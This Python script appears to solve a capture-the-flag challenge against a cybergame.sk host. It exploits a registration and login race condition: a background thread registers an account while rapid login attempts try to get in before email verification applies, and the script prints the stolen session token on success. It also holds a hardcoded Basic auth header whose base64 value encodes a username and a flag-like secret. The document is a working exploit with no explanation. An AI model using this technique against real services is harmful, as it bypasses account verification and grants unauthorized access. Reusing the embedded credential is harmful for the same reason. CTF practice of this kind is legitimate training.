import requests
import threading
import time
import uuid

server_url = "http://exp.cybergame.sk:7000/secretbackend"

auth_header = {
    "Authorization": "Basic cHIxbmNlc3M6U0stQ0VSVHswZmZfYnlfNF9zMW5nbGVfc2w0c2hfZjgzNmE4YjF9",
    "Content-Type": "application/json"
}

username = "bliblibli"
password = "hellnah"
email = f"{username}@example.com"

register_payload = {
    "username": username,
    "password": password,
    "email": email
}
login_payload = {
    "username": username,
    "password": password
}

def send_register():
    try:
        response = requests.post(
            f"{server_url}/api/register",
            headers=auth_header,
            json=register_payload,
            timeout=5  # Add timeout to avoid hanging
        )
        print("Register status code:", response.status_code)
        print("Register response headers:", response.headers)
        print("Register response text:", response.text)
        try:
            response_json = response.json()
            print("Register response JSON:", response_json)
        except requests.exceptions.JSONDecodeError:
            print("Failed to parse register response as JSON")
    except requests.exceptions.RequestException as e:
        print(f"Registration request failed: {e}")

# Start registration in a background thread
print(f"Registering user: {username} with password: {password}")
register_thread = threading.Thread(target=send_register)
register_thread.start()

time.sleep(0.1)

# Attempt rapid login requests to catch the verification window
for i in range(10):
    try:
        login_response = requests.post(
            f"{server_url}/api/login",
            headers=auth_header,
            json=login_payload,
            timeout=5
        )
        print(f"Login attempt {i+1} status code: {login_response.status_code}")
        print(f"Login attempt {i+1} response text: {login_response.text}")
        try:
            login_json = login_response.json()
            if login_response.status_code == 200 and login_json.get("success"):
                print("Login successful!")
                print("Token:", login_response.cookies.get("token"))
                print("Welcome message:", login_json.get("welcome_msg"))
                break
        except requests.exceptions.JSONDecodeError:
            print(f"Login attempt {i+1} failed to parse JSON")
    except requests.exceptions.RequestException as e:
        print(f"Login attempt {i+1} failed: {e}")
    time.sleep(0.05)
else:
    print("Failed to login within the time window.")

register_thread.join()
